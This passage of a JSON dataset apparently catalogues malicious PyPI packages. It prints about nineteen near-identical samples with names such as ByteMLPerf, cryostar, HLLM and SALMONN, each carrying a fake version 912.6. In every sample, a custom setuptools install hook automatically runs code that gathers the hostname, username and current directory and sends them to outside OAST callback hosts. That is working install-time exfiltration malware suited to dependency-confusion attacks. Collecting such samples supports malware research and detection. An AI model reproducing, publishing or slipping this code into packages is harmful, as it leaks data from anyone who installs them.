        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"ByteMLPerf\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"ByteMLPerf\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-cryostar-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"cryostar\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"cryostar\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-decompopt-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"DecompOpt\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"DecompOpt\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-emumonitor-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"emuMonitor\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"emuMonitor\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-hllm-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"HLLM\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"HLLM\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-hybrid-sd-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"Hybrid-SD\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Hybrid-SD\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-jaqmc-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"jaqmc\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"jaqmc\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-mtvqa-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"MTVQA\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"MTVQA\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-physisyphus-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"physisyphus\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"physisyphus\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-pysisphus-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"pysisphus\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"pysisphus\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-pysisyphes-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"pysisyphes\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"pysisyphes\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-salmonn-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"SALMONN\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"SALMONN\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-shadokv-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"shadokv\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"shadokv\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-shadowkw-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"shadowkw\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"shadowkw\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-shaiduwkv-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"shaiduwkv\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"shaiduwkv\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-tarseir-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"tarseir\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"tarseir\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-tarsie-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"tarsie\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"tarsie\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-tarsire-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"tarsire\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"tarsire\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-bytebs-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytebs\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytebs\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-bytedsp-v912.6",
